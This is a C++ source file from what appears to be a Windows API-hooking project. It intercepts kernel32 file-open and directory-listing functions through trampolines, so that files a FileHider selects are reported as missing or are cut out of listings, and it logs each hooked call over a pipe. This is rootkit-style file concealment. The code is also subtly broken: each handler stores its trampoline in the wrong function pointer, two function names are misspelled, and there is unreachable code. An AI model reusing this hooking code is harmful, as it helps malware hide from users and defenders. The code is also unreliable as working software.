#include "HookHandlers.h"

HANDLE(*OriginalCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
HANDLE(*OriginalCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
HANDLE(*OriginalFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
HANDLE(*OriginalFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
BOOL(*OriginalFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
BOOL(*OriginalFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);

Pipe& pipe = Pipe::getInstance();

void HookHandlers::HookLogging() {
	using namespace std::chrono;
	auto now = system_clock::now();
	auto ms = duration_cast<milliseconds>(now.time_since_epoch()) % 1000;
	std::time_t t = system_clock::to_time_t(now);
	std::tm local_tm;
	localtime_s(&local_tm, &t);

	std::ostringstream oss;
	oss << "[" << std::put_time(&local_tm, "%H:%M:%S")
		<< '.' << std::setfill('0') << std::setw(3)
		<< ms.count() << "] "
		<< HookManager::getInstance().getLastHookedFuncName() << " executed";

	std::string message = oss.str();
	pipe.sendMessage(message);

	return;
}

HANDLE __stdcall HookHandlers::HookCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	if (FileHider::getInstance().shouldHideFile(lpFileName)) {
		SetLastError(ERROR_FILE_NOT_FOUND);
		return INVALID_HANDLE_VALUE;
		std::cout << HookManager::getInstance().getLastHookedFuncName() << std::endl;
	}

	std::cout << HookManager::getInstance().getLastHookedFuncName() << std::endl;
	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "CreateFileA");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

HANDLE __stdcall HookHandlers::HookCreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	std::wstring wstr(lpFileName);
	std::string strFileName(wstr.begin(), wstr.end());

	if (FileHider::getInstance().shouldHideFile(strFileName)) {
		SetLastError(ERROR_FILE_NOT_FOUND);
		return INVALID_HANDLE_VALUE;
	}

	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "CreateFileW");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalCreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

HANDLE __stdcall HookHandlers::HookFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
	if (FileHider::getInstance().shouldHideFile(lpFileName)) {
		SetLastError(ERROR_FILE_NOT_FOUND);
		return INVALID_HANDLE_VALUE;
	}
	
	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirsFileA");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalFindFirstFileA(lpFileName, lpFindFileData);
}

HANDLE __stdcall HookHandlers::HookFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
	std::wstring wstr(lpFileName);
	std::string strFileName(wstr.begin(), wstr.end());

	if (FileHider::getInstance().shouldHideFile(strFileName)) {
		SetLastError(ERROR_FILE_NOT_FOUND);
		return INVALID_HANDLE_VALUE;
	}

	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindFirsFileW");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalFindFirstFileW(lpFileName, lpFindFileData);
}

BOOL __stdcall HookHandlers::HookFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	if (FileHider::getInstance().shouldHideFile(lpFindFileData->cFileName)) {
		SetLastError(ERROR_NO_MORE_FILES);
		return FALSE;
	}

	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindNextFileA");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalFindNextFileA(hFindFile, lpFindFileData);
}

BOOL __stdcall HookHandlers::HookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	std::wstring wstr(lpFindFileData->cFileName);
	std::string strFileName(wstr.begin(), wstr.end());

	if (FileHider::getInstance().shouldHideFile(strFileName)) {
		SetLastError(ERROR_NO_MORE_FILES);
		return FALSE;
	}

	void* trampolineAddress = HookManager::getInstance().getTrampolineAddress("kernel32.dll", "FindNextFileW");

	memcpy((void*)(&OriginalCreateFileA), &trampolineAddress, sizeof(uint64_t));
	return OriginalFindNextFileW(hFindFile, lpFindFileData);
}
